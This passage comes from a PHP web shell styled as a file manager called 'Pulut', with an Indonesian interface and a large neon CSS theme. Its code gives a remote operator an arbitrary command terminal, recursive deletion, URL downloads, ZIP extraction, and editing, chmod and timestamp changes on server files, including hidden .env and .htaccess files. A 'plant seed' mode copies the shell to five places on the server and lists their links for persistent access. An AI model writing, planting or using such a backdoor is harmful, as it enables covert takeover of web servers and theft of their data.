                echo '<script>window.location.href="' . $pengalihan . '";</script>';
                exit;
            }
        }
    }
    
    $_SESSION['pesan'] = $pesan;
    $_SESSION['keluaran_perintah'] = $keluaran_perintah;
    
    $pengalihan = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
    if (!headers_sent()) {
        header("Location: " . $pengalihan);
        exit;
    } else {
        echo '<script>window.location.href="' . $pengalihan . '";</script>';
        exit;
    }
}

// ==================== OPERASI GET ====================
if (isset($_GET['__hapus__'])) {
    $target = $__dir__ . basename($_GET['__hapus__']);
    if (@file_exists($target)) {
        if (@is_dir($target)) {
            eksekusiLokal("rm -rf " . escapeshellarg($target), $__dir__);
        } else {
            @unlink($target);
        }
        $pesan[] = "🗑 Dihapus: " . basename($target);
        $_SESSION['pesan'] = $pesan;
        $pengalihan = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
        header("Location: " . $pengalihan);
        exit;
    }
}

if (isset($_GET['__ekstrak__'])) {
    $target = $__dir__ . basename($_GET['__ekstrak__']);
    if (@file_exists($target) && pathinfo($target, PATHINFO_EXTENSION) === 'zip') {
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($target) === TRUE) {
                $zip->extractTo($__dir__);
                $zip->close();
                $pesan[] = "📦 Diekstrak: " . basename($target);
                $_SESSION['pesan'] = $pesan;
                $pengalihan = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__);
                header("Location: " . $pengalihan);
                exit;
            }
        }
    }
}

if (isset($_GET['__chmod__'])) {
    $chmod_file = basename($_GET['__chmod__']);
}

if (isset($_GET['__sentuh__'])) {
    $sentuh_file = basename($_GET['__sentuh__']);
}

if (isset($_GET['__ganti_nama__'])) {
    $ganti_nama_file = basename($_GET['__ganti_nama__']);
}

if (isset($_GET['__edit__'])) {
    $file_diedit = basename($_GET['__edit__']);
    $konten_file = @file_get_contents($__dir__ . $file_diedit);
}

if (isset($_GET['keluar'])) {
    session_destroy();
    echo '<script>window.location.href="?";</script>';
    exit;
}

// Jika ada parameter tampil_link, tampilkan hasil penyebaran
$tampilkan_hasil_sebar = isset($_GET['__tampil_link__']) && isset($_SESSION['hasil_sebar']);

// Jika tidak ada tampil_link, hapus hasil_sebar dari session
if (!isset($_GET['__tampil_link__']) && isset($_SESSION['hasil_sebar'])) {
    unset($_SESSION['hasil_sebar']);
}

$_SESSION['pesan'] = $pesan;
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🍚 Mode Pulut</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Exo+2:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --biru-neon: #198f36;
            --ungu-neon: #979797;
            --merah-muda-neon: #d0ff00;
            --cyan-neon: #00ffff;
            --gelap-kosmik: #424249;
            --putih-bintang: #ffffff;
            --ungu-nebula: #397896;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Exo 2', sans-serif;
            background: #000;
            color: #fff;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }
        
        .latar-utama {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 10% 20%, rgba(74, 0, 224, 0.4) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(0, 210, 255, 0.3) 0%, transparent 40%),
                radial-gradient(circle at 50% 50%, rgba(255, 0, 255, 0.2) 0%, transparent 50%),
                linear-gradient(135deg, #000000 0%, #0a0a2a 50%, #1a0033 100%);
            z-index: -3;
        }
        
        .bintang-dinamis {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
        }
        
        .partikel-bintang {
            position: absolute;
            background: #fff;
            border-radius: 50%;
            animation: bintangKedip 3s infinite alternate;
        }
        
        @keyframes bintangKedip {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 1; }
        }
        
        .cincin-pulsar {
            position: fixed;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 1px solid rgba(0, 210, 255, 0.1);
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: pulsar 10s infinite linear;
            z-index: -1;
        }
        
        @keyframes pulsar {
            0% { 
                transform: translate(-50%, -50%) scale(1);
                opacity: 0.1;
            }
            50% { 
                transform: translate(-50%, -50%) scale(1.5);
                opacity: 0.3;
            }
            100% { 
                transform: translate(-50%, -50%) scale(1);
                opacity: 0.1;
            }
        }
        
        .kontainer-kosmik {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }
        
        .header-kosmik {
            background: rgba(10, 10, 40, 0.7);
            border: 1px solid var(--biru-neon);
            border-radius: 25px;
            padding: 30px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            box-shadow: 
                0 0 60px rgba(0, 210, 255, 0.3),
                inset 0 0 40px rgba(0, 210, 255, 0.1);
            position: relative;
            overflow: hidden;
        }
        
        .header-kosmik::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--biru-neon), transparent);
        }
        
        .header-kosmik h1 {
            font-family: 'Orbitron', monospace;
            font-size: 3.5rem;
            font-weight: 900;
            margin-bottom: 15px;
            background: linear-gradient(135deg, var(--biru-neon), var(--ungu-neon), var(--merah-muda-neon));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 40px rgba(0, 210, 255, 0.5);
            letter-spacing: 2px;
            animation: kilauJudul 4s ease-in-out infinite alternate;
        }
        
        @keyframes kilauJudul {
            0% { text-shadow: 0 0 30px rgba(0, 210, 255, 0.5); }
            100% { text-shadow: 0 0 60px rgba(0, 210, 255, 0.8), 0 0 90px rgba(142, 45, 226, 0.5); }
        }
        
        .navigasi-jalur {
            background: rgba(0, 0, 0, 0.5);
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 20px;
            border-left: 4px solid var(--biru-neon);
            font-family: 'Courier New', monospace;
            font-size: 16px;
            word-break: break-all;
            border: 1px solid rgba(0, 210, 255, 0.2);
            backdrop-filter: blur(5px);
        }
        
        .navigasi-jalur a {
            color: var(--cyan-neon);
            text-decoration: none;
            transition: all 0.3s;
            padding: 5px 10px;
            border-radius: 5px;
        }
        
        .navigasi-jalur a:hover {
            color: var(--biru-neon);
            background: rgba(0, 210, 255, 0.1);
            text-shadow: 0 0 10px var(--biru-neon);
        }
        
        .lencana-status {
            display: inline-block;
            padding: 12px 24px;
            border-radius: 25px;
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 20px;
            background: rgba(0, 210, 255, 0.1);
            color: var(--biru-neon);
            border: 1px solid rgba(0, 210, 255, 0.3);
            font-family: 'Orbitron', monospace;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }
        
        .lencana-status::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 210, 255, 0.2), transparent);
            animation: geser 3s infinite;
        }
        
        @keyframes geser {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        
        .tombol-aksi {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin-top: 25px;
        }
        
        .tombol-kosmik {
            padding: 12px 24px;
            border-radius: 12px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            font-family: 'Exo 2', sans-serif;
            font-size: 15px;
            position: relative;
            overflow: hidden;
            z-index: 1;
        }
        
        .tombol-kosmik::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: 0.5s;
            z-index: -1;
        }
        
        .tombol-kosmik:hover::before {
            left: 100%;
        }
        
        .tombol-utama { 
            background: linear-gradient(135deg, var(--biru-neon), var(--ungu-neon));
            color: white; 
        }
        
        .tombol-kedua { 
            background: rgba(255, 255, 255, 0.1);
            color: var(--cyan-neon);
            border: 1px solid rgba(0, 210, 255, 0.3);
        }
        
        .tombol-bahaya { 
            background: linear-gradient(135deg, #ff416c, #ff4b2b);
            color: white; 
        }
        
        .tombol-sukses { 
            background: linear-gradient(135deg, #00b09b, #96c93d);
            color: white; 
        }
        
        .tombol-peringatan { 
            background: linear-gradient(135deg, #ff8008, #ffc837);
            color: white; 
        }
        
        .tombol-kosmik:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 210, 255, 0.4);
        }
        
        .pesan {
            margin-bottom: 30px;
            animation: fadeOut 5s forwards;
        }
        
        @keyframes fadeOut {
            0% { opacity: 1; }
            70% { opacity: 1; }
            100% { opacity: 0; display: none; }
        }
        
        .pesan-kosmik {
            padding: 20px;
            margin-bottom: 15px;
            border-radius: 15px;
            background: rgba(10, 10, 40, 0.7);
            border-left: 4px solid var(--biru-neon);
            box-shadow: 0 5px 20px rgba(0, 210, 255, 0.1);
            backdrop-filter: blur(5px);
            border: 1px solid rgba(0, 210, 255, 0.2);
        }
        
        /* ===== BOX HASIL PENYEBARAN ===== */
        .hasil-sebar {
            background: rgba(0, 50, 0, 0.8);
            border: 2px solid #00ff00;
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 0 50px rgba(0, 255, 0, 0.3);
            animation: glow 2s infinite alternate;
        }
        
        @keyframes glow {
            from { box-shadow: 0 0 20px rgba(0, 255, 0, 0.3); }
            to { box-shadow: 0 0 50px rgba(0, 255, 0, 0.7); }
        }
        
        .hasil-sebar h2 {
            color: #00ff00;
            font-family: 'Orbitron', monospace;
            margin-bottom: 20px;
            font-size: 24px;
        }
        
        .link-item {
            background: rgba(0, 0, 0, 0.5);
            border-left: 4px solid #00ff00;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 10px;
        }
        
        .link-item .url {
            color: #00ff00;
            font-size: 14px;
            word-break: break-all;
            margin: 10px 0;
            padding: 10px;
            background: #000;
            border-radius: 5px;
            font-family: monospace;
        }
        
        .link-item a {
            color: #00ff00;
            text-decoration: none;
            font-weight: bold;
        }
        
        .link-item a:hover {
            text-decoration: underline;
        }
        
        .link-item .path {
            color: #888;
            font-size: 12px;
        }
        
        .tombol-redirect {
            display: inline-block;
            padding: 15px 30px;
            background: #00ff00;
            color: #000;
            text-decoration: none;
            font-weight: bold;
            border-radius: 10px;
            margin-top: 20px;
            font-size: 18px;
        }
        
        .tombol-redirect:hover {
            background: #00cc00;
        }
        
        .petak-unggah {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .kotak-kosmik {
            background: rgba(10, 10, 40, 0.7);
            border: 1px solid rgba(0, 210, 255, 0.3);
            border-radius: 20px;
            padding: 30px;
            backdrop-filter: blur(10px);
            box-shadow: 
                0 0 40px rgba(0, 210, 255, 0.2),
                inset 0 0 20px rgba(0, 210, 255, 0.1);
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .kotak-kosmik:hover {
            transform: translateY(-5px);
            box-shadow: 
                0 15px 50px rgba(0, 210, 255, 0.3),
                inset 0 0 30px rgba(0, 210, 255, 0.15);
        }
        
        .kotak-kosmik h3 {
            color: var(--biru-neon);
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 15px;
            font-family: 'Orbitron', monospace;
            font-size: 1.3rem;
            letter-spacing: 1px;
        }
        
        .input-kosmik {
            width: 100%;
            padding: 16px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 210, 255, 0.3);
            border-radius: 10px;
            color: #fff;
            font-size: 15px;
            margin-bottom: 20px;
            font-family: 'Exo 2', sans-serif;
            transition: all 0.3s;
        }
        
        .input-kosmik:focus {
            outline: none;
            border-color: var(--biru-neon);
            box-shadow: 0 0 25px rgba(0, 210, 255, 0.3);
            background: rgba(0, 0, 0, 0.7);
        }
        
        .tabel-kosmik {
            width: 100%;
            background: rgba(10, 10, 40, 0.7);
            border-radius: 20px;
            overflow: hidden;
            margin-bottom: 40px;
            border: 1px solid rgba(0, 210, 255, 0.2);
            backdrop-filter: blur(5px);
            box-shadow: 0 10px 40px rgba(0, 210, 255, 0.1);
        }
        
        .tabel-kosmik th {
            background: rgba(0, 210, 255, 0.1);
            padding: 20px;
            text-align: left;
            font-weight: 600;
            color: var(--biru-neon);
            font-family: 'Orbitron', monospace;
            letter-spacing: 1px;
            border-bottom: 2px solid rgba(0, 210, 255, 0.3);
        }
        
        .tabel-kosmik td {
            padding: 18px 20px;
            border-bottom: 1px solid rgba(0, 210, 255, 0.1);
            transition: all 0.3s;
        }
        
        .tabel-kosmik tr:hover {
            background: rgba(0, 210, 255, 0.05);
        }
        
        .nama-kosmik {
            cursor: pointer;
            color: var(--cyan-neon);
            text-decoration: none;
            font-weight: 500;
            padding: 8px 12px;
            border-radius: 8px;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        
        .nama-kosmik:hover {
            background: rgba(0, 210, 255, 0.1);
            text-decoration: none;
            transform: translateX(5px);
            text-shadow: 0 0 15px var(--biru-neon);
            box-shadow: 0 5px 15px rgba(0, 210, 255, 0.2);
        }
        
        .nama-folder {
            color: var(--ungu-neon);
        }
        
        .nama-file {
            color: var(--cyan-neon);
        }
        
        .hidden-item {
            background: rgba(255, 255, 0, 0.05);
        }
        
        .hidden-item:hover {
            background: rgba(255, 255, 0, 0.1);
        }
        
        .ikon-aksi {
            padding: 8px 16px;
            border-radius: 8px;
            font-size: 13px;
            margin: 3px;
            display: inline-block;
            text-decoration: none;
            font-family: 'Exo 2', sans-serif;
            font-weight: 500;
            transition: all 0.3s;
        }
        
        .ikon-aksi.open {
            background: rgba(0, 255, 255, 0.2);
            color: #00ffff;
            border: 1px solid #00ffff;
        }
        
        .ikon-aksi.open:hover {
            background: #00ffff;
            color: #000;
        }
        
        .terminal-kosmik {
            background: rgba(10, 10, 40, 0.8);
            border: 1px solid rgba(0, 210, 255, 0.3);
            border-radius: 20px;
            padding: 30px;
            margin-top: 40px;
            margin-bottom: 40px;
            backdrop-filter: blur(10px);
            box-shadow: 
                0 0 50px rgba(0, 210, 255, 0.2),
                inset 0 0 30px rgba(0, 210, 255, 0.1);
            position: relative;
            overflow: hidden;
        }
        
        .terminal-kosmik::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--biru-neon), transparent);
        }
        
        .keluaran-terminal {
            background: rgba(0, 0, 0, 0.7);
            color: #fff;
            padding: 25px;
            border-radius: 12px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            white-space: pre-wrap;
            max-height: 500px;
            overflow-y: auto;
            margin-top: 20px;
            line-height: 1.6;
            border: 1px solid rgba(0, 210, 255, 0.2);
        }
        
        .status-perintah {
            display: inline-block;
            padding: 6px 15px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: bold;
            margin-bottom: 10px;
            font-family: 'Orbitron', monospace;
            letter-spacing: 1px;
        }
        
        .status-sukses {
            background: rgba(0, 176, 155, 0.2);
            color: #00b09b;
            border: 1px solid rgba(0, 176, 155, 0.3);
        }
        
        .status-error {
            background: rgba(255, 65, 108, 0.2);
            color: #ff416c;
            border: 1px solid rgba(255, 65, 108, 0.3);
        }
        
        .penyunting-kosmik {
            background: rgba(10, 10, 40, 0.8);
            border: 1px solid rgba(0, 210, 255, 0.3);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 40px;
            backdrop-filter: blur(10px);
        }
        
        .penyunting-kosmik textarea {
            width: 100%;
            height: 400px;
            background: #0a0a14;
            color: #e2e8f0;
            font-family: 'Courier New', monospace;
            font-size: 15px;
            border: 1px solid rgba(0, 210, 255, 0.3);
            border-radius: 12px;
            padding: 20px;
            resize: vertical;
        }
        
        .modal-kosmik {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(5px);
        }
        
        .konten-modal {
            background: rgba(10, 10, 40, 0.9);
            border: 1px solid rgba(0, 210, 255, 0.3);
            border-radius: 25px;
            padding: 40px;
            max-width: 700px;
            width: 90%;
            backdrop-filter: blur(20px);
            box-shadow: 
                0 0 80px rgba(0, 210, 255, 0.3),
                inset 0 0 40px rgba(0, 210, 255, 0.1);
            position: relative;
            animation: munculModal 0.5s ease-out;
        }
        
        @keyframes munculModal {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        
        .konten-modal::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--biru-neon), transparent);
        }
        
        .peringatan-hilang {
            background: rgba(255, 65, 108, 0.2);
            border: 1px solid #ff416c;
            color: #ff416c;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            text-align: center;
            font-weight: bold;
        }
        
        input[type="checkbox"] {
            width: 20px;
            height: 20px;
            accent-color: var(--biru-neon);
            cursor: pointer;
        }
        
        ::-webkit-scrollbar {
            width: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, var(--biru-neon), var(--ungu-neon));
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(135deg, var(--cyan-neon), var(--merah-muda-neon));
        }
        
        @media (max-width: 768px) {
            .kontainer-kosmik { padding: 10px; }
            .petak-unggah { grid-template-columns: 1fr; }
            .tombol-aksi { flex-direction: column; }
            .tombol-kosmik { width: 100%; }
            .header-kosmik h1 { font-size: 2.5rem; }
        }
        
        .partikel-kuantum {
            position: fixed;
            width: 4px;
            height: 4px;
            background: var(--biru-neon);
            border-radius: 50%;
            pointer-events: none;
            z-index: 0;
            animation: melayangKuantum 20s infinite linear;
            opacity: 0;
        }
        
        @keyframes melayangKuantum {
            0% {
                transform: translate(0, 0) rotate(0deg);
                opacity: 0;
            }
            10% {
                opacity: 0.5;
            }
            90% {
                opacity: 0.5;
            }
            100% {
                transform: translate(calc(100vw * var(--tx)), calc(100vh * var(--ty))) rotate(360deg);
                opacity: 0;
            }
        }
    </style>
</head>
<body>
    <div class="latar-utama"></div>
    <div class="bintang-dinamis" id="bintangDinamis"></div>
    <div class="cincin-pulsar"></div>
    
    <div class="kontainer-kosmik">
        <div class="header-kosmik">
            <h1>👩🏻‍🍳Pulut🥣</h1>
            
            <div class="navigasi-jalur">
                <?php
                $bagian = explode('/', trim($__dir__, '/'));
                $saat_ini = '';
                echo '<a href="?__d__=/">/</a>';
                foreach ($bagian as $bag) {
                    if ($bag) {
                        $saat_ini .= '/' . $bag;
                        echo '/<a href="?__d__=' . urlencode($saat_ini) . '">' . htmlspecialchars($bag) . '</a>';
                    }
                }
                ?>
            </div>
            
            <div class="lencana-status">
                🔧 Izin: <?php echo substr(sprintf('%o', @fileperms($__dir__)), -4); ?>
                | 💾 Bebas: <?php echo round(disk_free_space($__dir__)/1024/1024/1024, 2); ?>GB
                | 🚀 Kuantum: Aktif
                | 🌱 Mode: Penyebar (5 titik)
                | 👁️ Hidden: Tampil
            </div>
            
            <div class="tombol-aksi">
                <a href="?__d__=<?php echo urlencode(dapatkanDirektoriSaatIni()); ?>" class="tombol-kosmik tombol-kedua">🏠 Home</a>
                <a href="?__d__=<?php echo urlencode(dirname($__dir__)); ?>" class="tombol-kosmik tombol-kedua">🔙 Kembali</a>
                <a href="?__d__=<?php echo urlencode($__dir__); ?>" class="tombol-kosmik tombol-kedua">🔄 Refresh</a>
                <button class="tombol-kosmik tombol-peringatan" onclick="tampilkanModalBuat()">➕ Buat</button>
                <button class="tombol-kosmik tombol-bahaya" onclick="tampilkanModalHapus()">🗑 Hapus Terpilih</button>
                <button class="tombol-kosmik tombol-sukses" onclick="tampilkanModalSebar()">🌱 Tanam Benih</button>
                <a href="?keluar=1" class="tombol-kosmik tombol-bahaya">🚪 Keluar</a>
            </div>
        </div>
        
        <?php if (!empty($pesan)): ?>
        <div class="pesan">
            <?php foreach ($pesan as $p): ?>
                <div class="pesan-kosmik">✨ <?php echo htmlspecialchars($p); ?></div>
            <?php endforeach; ?>
        </div>
        <?php endif; ?>
        
        <!-- ===== TAMPILKAN HASIL PENYEBARAN ===== -->
        <?php if ($tampilkan_hasil_sebar && isset($_SESSION['hasil_sebar'])): ?>
        <div class="hasil-sebar">
            <h2>✅ PENYEBARAN BERHASIL - 5 LINK TERSEDIA</h2>
            <p style="color: #00ff00; margin-bottom: 20px;">Waktu: <?php echo $_SESSION['hasil_sebar']['waktu']; ?></p>
            
            <?php foreach ($_SESSION['hasil_sebar']['url'] as $index => $url): 
                $path = $_SESSION['hasil_sebar']['tujuan'][$index];
                $file = basename($path);
            ?>
            <div class="link-item">
                <div style="font-weight: bold; color: #00ff00; margin-bottom: 5px;">
                    🌱 TITIK <?php echo $index + 1; ?>: <?php echo $file; ?>
                </div>
                <div class="path">📁 <?php echo htmlspecialchars($path); ?></div>
                <div class="url">
                    <a href="<?php echo $url; ?>" target="_blank" style="color: #00ff00; font-size: 16px;">
                        🔗 <?php echo $url; ?>
                    </a>
                </div>
                <div style="margin-top: 5px;">
                    <a href="<?php echo $url; ?>" target="_blank" class="tombol-kosmik tombol-sukses" style="padding: 5px 15px; font-size: 12px;">🔗 Buka Link</a>
                </div>
            </div>
            <?php endforeach; ?>
            
            <div style="text-align: center; margin-top: 30px;">
                <a href="?__d__=<?php echo urlencode($__dir__); ?>" class="tombol-redirect">🔙 Kembali ke File Manager</a>
            </div>
            
            <div class="peringatan-hilang" style="margin-top: 20px;">
                ⚠️ FILE ASLI AKAN HILANG JIKA ANDA MENUTUP HALAMAN INI ⚠️<br>
                <small>Klik link di atas untuk mengakses file yang tersebar</small>
            </div>
        </div>
        <?php unset($_SESSION['hasil_sebar']); ?>
        <?php endif; ?>
        
        <div class="petak-unggah">
            <div class="kotak-kosmik">
                <h3>📤 Unggah File</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="file[]" class="input-kosmik" multiple required>
                    <small style="color: #a0a0ff; display: block; margin-bottom: 15px;">Maks: <?php echo ini_get('upload_max_filesize'); ?>, Format: Semua jenis file (termasuk .htaccess, .env)</small>
                    <button type="submit" class="tombol-kosmik tombol-utama">🚀 Upload</button>
                </form>
            </div>
            
            <div class="kotak-kosmik">
                <h3>📦 Extract ZIP (Tanpa Simpan)</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="file_zip" class="input-kosmik" accept=".zip" required>
                    <small style="color: #a0a0ff; display: block; margin-bottom: 15px;">File ZIP langsung diekstrak, TIDAK DISIMPAN</small>
                    <button type="submit" class="tombol-kosmik tombol-utama">📦 Extract</button>
                </form>
            </div>
            
            <div class="kotak-kosmik">
                <h3>🌐 Download via URL</h3>
                <form method="post">
                    <input type="url" name="__url__" class="input-kosmik" placeholder="https://example.com/file.zip" required>
                    <input type="text" name="__nama_file__" class="input-kosmik" placeholder="Nama file (opsional)">
                    <button type="submit" class="tombol-kosmik tombol-utama">⬇️ Download</button>
                </form>
            </div>
            
            <div class="kotak-kosmik">
                <h3>💻 Terminal</h3>
                <form method="post">
                    <input type="text" name="__perintah__" class="input-kosmik" 
                           placeholder="Masukkan perintah (ls, pwd, wget, curl, dll.)" 
                           value="<?php echo isset($_POST['__perintah__']) ? htmlspecialchars($_POST['__perintah__']) : ''; ?>" 
                           id="inputTerminal" autocomplete="off">
                    <div style="font-size: 14px; color: #a0a0ff; margin-bottom: 15px;">
                        ⚡ Didukung: ls, pwd, whoami, id, uname, df, du, ps, zip, unzip, wget, curl, dll.
                    </div>
                    <button type="submit" class="tombol-kosmik tombol-utama">🚀 Jalankan</button>
                </form>
            </div>
        </div>
        
        <div class="kontainer-tabel-file">
            <table class="tabel-kosmik">
                <thead>
                    <tr>
                        <th><input type="checkbox" id="pilihSemua"></th>
                        <th>Nama</th>
                        <th>Ukuran</th>
                        <th>Izin</th>
                        <th>Diubah</th>
                        <th>Tindakan</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $item = @scandir($__dir__);
                    if ($item) {
                        $folder = $file = [];
                        foreach ($item as $i) {
                            // TAMPILKAN SEMUA FILE termasuk hidden (kecuali . dan ..)
                            if ($i == '.' || $i == '..') continue;
                            
                            $jalur = $__dir__ . $i;
                            if (@is_dir($jalur)) {
                                $folder[] = $i;
                            } else {
                                $file[] = $i;
                            }
                        }
                        
                        sort($folder);
                        sort($file);
                        
                        // Tampilkan FOLDER dulu (termasuk hidden folder)
                        foreach ($folder as $i) {
                            $jalur = $__dir__ . $i;
                            $izin = substr(sprintf('%o', @fileperms($jalur)), -4);
                            $diubah = date('Y-m-d H:i', @filemtime($jalur));
                            
                            // Deteksi hidden folder
                            $is_hidden = (substr($i, 0, 1) === '.');
                            $hidden_class = $is_hidden ? 'hidden-item' : '';
                            $hidden_label = $is_hidden ? '<span style="color: #ffaa00; font-size: 11px; margin-left: 5px;">(hidden)</span>' : '';
                            ?>
                            <tr class="<?php echo $hidden_class; ?>">
                                <td><input type="checkbox" name="item_terpilih[]" value="<?php echo htmlspecialchars($i); ?>"></td>
                                <td>
                                    <a href="?__d__=<?php echo urlencode($jalur); ?>" class="nama-kosmik nama-folder">
                                        <strong><?php echo $is_hidden ? '📁 🔒' : '📁'; ?> <?php echo htmlspecialchars($i); ?></strong>
                                        <?php echo $hidden_label; ?>
                                    </a>
                                </td>
                                <td>-</td>
                                <td><?php echo $izin; ?></td>
                                <td><?php echo $diubah; ?></td>
                                <td>
                                    <a href="#" onclick="tampilkanModalGantiNama('<?php echo htmlspecialchars(addslashes($i)); ?>')" class="ikon-aksi tombol-peringatan">Ganti Nama</a>
                                    <a href="#" onclick="tampilkanModalSentuh('<?php echo htmlspecialchars(addslashes($i)); ?>')" class="ikon-aksi tombol-kedua">Waktu</a>
                                    <a href="#" onclick="tampilkanModalChmod('<?php echo htmlspecialchars(addslashes($i)); ?>', '<?php echo $izin; ?>')" class="ikon-aksi tombol-kedua">Izin</a>
                                    <a href="?__d__=<?php echo urlencode($__dir__); ?>&__hapus__=<?php echo urlencode($i); ?>" 
                                       class="ikon-aksi tombol-bahaya" onclick="return confirm('Hapus folder ini?')">Hapus</a>
                                </td>
                            </tr>
                            <?php
                        }
                        
                        // Tampilkan FILE (termasuk hidden file)
                        foreach ($file as $i) {
                            $jalur = $__dir__ . $i;
                            $ukuran = @filesize($jalur);
                            $izin = substr(sprintf('%o', @fileperms($jalur)), -4);
                            $diubah = date('Y-m-d H:i', @filemtime($jalur));
                            $ekstensi = strtolower(pathinfo($i, PATHINFO_EXTENSION));
                            
                            // Deteksi hidden file
                            $is_hidden = (substr($i, 0, 1) === '.');
                            $hidden_class = $is_hidden ? 'hidden-item' : '';
                            $hidden_label = $is_hidden ? '<span style="color: #ffaa00; font-size: 11px; margin-left: 5px;">(hidden)</span>' : '';
                            
                            // Buat URL untuk tombol OPEN
                            $url_file = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') 
                                      . $_SERVER['HTTP_HOST'] 
                                      . str_replace($_SERVER['DOCUMENT_ROOT'], '', $jalur);
                            
                            // Tentukan ikon berdasarkan jenis file
                            $icon = '📄';
                            if ($ekstensi == 'php') $icon = '🐘';
                            else if ($ekstensi == 'html' || $ekstensi == 'htm') $icon = '🌐';
                            else if ($ekstensi == 'css') $icon = '🎨';
                            else if ($ekstensi == 'js') $icon = '⚡';
                            else if (in_array($ekstensi, ['jpg','jpeg','png','gif','bmp','webp'])) $icon = '🖼️';
                            else if (in_array($ekstensi, ['zip','rar','7z','tar','gz'])) $icon = '📦';
                            else if (in_array($ekstensi, ['txt','log','md'])) $icon = '📝';
                            else if ($ekstensi == 'sql') $icon = '🗄️';
                            else if ($ekstensi == 'json') $icon = '📊';
                            else if ($ekstensi == 'xml') $icon = '📋';
                            else if ($ekstensi == 'htaccess') $icon = '🔒';
                            else if ($ekstensi == 'env') $icon = '🔐';
                            
                            // Tombol ekstrak untuk ZIP
                            $tombolEkstrak = '';
                            if ($ekstensi == 'zip') {
                                $tombolEkstrak = '<a href="?__d__=' . urlencode($__dir__) . '&__ekstrak__=' . urlencode($i) . '" class="ikon-aksi tombol-sukses">📦 Ekstrak</a>';
                            }
                            
                            // Cek apakah file bisa diedit
                            $bisa_diedit = true;
                            if ($ukuran > 2 * 1024 * 1024) $bisa_diedit = false;
                            
                            $ekstensi_binary = [
                                'jpg','jpeg','png','gif','bmp','ico','webp',
                                'mp4','mp3','avi','mov','wmv','flv','mkv',
                                'pdf','doc','docx','xls','xlsx','ppt','pptx',
                                'zip','rar','7z','tar','gz','bz2',
                                'exe','dll','so','bin','iso'
                            ];
                            if (in_array($ekstensi, $ekstensi_binary)) $bisa_diedit = false;
                            ?>
                            <tr class="<?php echo $hidden_class; ?>">
                                <td><input type="checkbox" name="item_terpilih[]" value="<?php echo htmlspecialchars($i); ?>"></td>
                                <td>
                                    <?php if ($bisa_diedit): ?>
                                        <a href="?__d__=<?php echo urlencode($__dir__); ?>&__edit__=<?php echo urlencode($i); ?>" class="nama-kosmik nama-file">
                                            <?php echo $icon; ?> <?php echo $is_hidden ? '🔒' : ''; ?> <?php echo htmlspecialchars($i); ?>
                                            <?php echo $hidden_label; ?>
                                        </a>
                                    <?php else: ?>
